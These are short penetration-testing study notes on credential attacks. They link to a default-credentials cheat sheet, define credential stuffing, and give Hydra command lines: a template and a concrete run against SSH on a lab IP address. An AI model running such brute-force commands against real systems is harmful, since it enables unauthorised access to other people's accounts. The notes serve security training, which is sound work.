Default creds cheat sheet:
https://github.com/ihebski/DefaultCreds-cheat-sheet

Credential stuffing: when passwords are leaked, they will be sold to attackers. Attackers will test these stolen credentials in hundreds of websites. This is credential stuffing.

Credential Stuffing - Hydra Syntax
```shell-session
hydra -C <user_pass.list> <protocol>://<IP>
```

Credential Stuffing - Hydra
```shell-session
hydra -C user_pass.list ssh://10.129.42.197
```

